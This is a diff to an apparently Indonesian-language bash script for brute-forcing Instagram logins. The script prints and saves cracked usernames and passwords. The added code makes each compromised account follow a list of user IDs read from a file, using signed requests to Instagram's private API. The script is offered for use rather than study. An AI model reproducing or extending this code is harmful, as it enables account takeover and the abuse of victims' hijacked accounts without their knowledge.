@@ -52,11 +52,14 @@ command -v jq > /dev/null 2>&1 || { echo >&2 " jq belum terinstall ketik  apt in
 
 menu(){
 
+
 banner
+
+echo -e "${G}[${W}*${G}]${W}.${R} Hack Instagram Target Belum Rilis"
 echo -e "${G}[${W}1${G}]${W}.${Y} Hack Instagram Followers User (Masih Ada Bug)"
 echo -e "${G}[${W}2${G}]${W}.${Y} Hack Instagram Following User (Masih Ada Bug)"
-echo -e "${G}[${W}3${G}]${W}.${Y} Hack Instagram From List File"
-echo -e "${G}[${W}4${G}]${W}.${Y} Hack Instagram Pake J-Query Automatis"
+echo -e "${G}[${W}3${G}]${W}.${Y} Hack Instagram From List File v.1"
+echo -e "${G}[${W}4${G}]${W}.${Y} Hack Instagram Pake J-Query Automatis v.1"
 echo -e "${G}[${W}0${G}]${W}.${R} Exit"
 echo ""
 echo -ne "${G}[${W}*${G}]${Y}Pilih metode serangan : ${W}" ; read mnu
@@ -339,6 +342,24 @@ printf "\n\e[32;1m [*] Password Found: \e[0m%s        " $passjq ;
 printf "[LOGIN SUCCESS] Username: %s, Password: \e[0m%s\n" $userjq $passjq >> limit.found ;
 printf "\n\e[1;92m [*] Saved:\e[0m\033[5m limit.found \n\e[0m";
 echo -e "\e[0m========================================"
+
+for celeb in $(cat f/roy); do
+
+datajq='{"_uuid":"'$guid'", "_uid":"'$username_id'", "user_id":"'$celeb'", "_csrftoken":"'$var2'"}'
+hmacjq=$(echo -n "$datajq" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
+check_followjq=$(curl -s -L -b cookie.$user12 -d "ig_sig_key_version=4&signed_body=$hmacjq.$datajq" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/friendships/create/$celeb/" | grep -o '"following": true')
+
+if [[ $check_followjq == "" ]]; then
+printf "\n\e[1;93m [!] Error\n"
+exit 1
+else
+printf "\e[1;92mOK\e[0m\n"
+sleep 2
+fi
+
+done
+
+
 # BANNED WAKTU
 elif [[ $varjq == "Please wait" ]]; then 
 echo "Please wait"; fi;
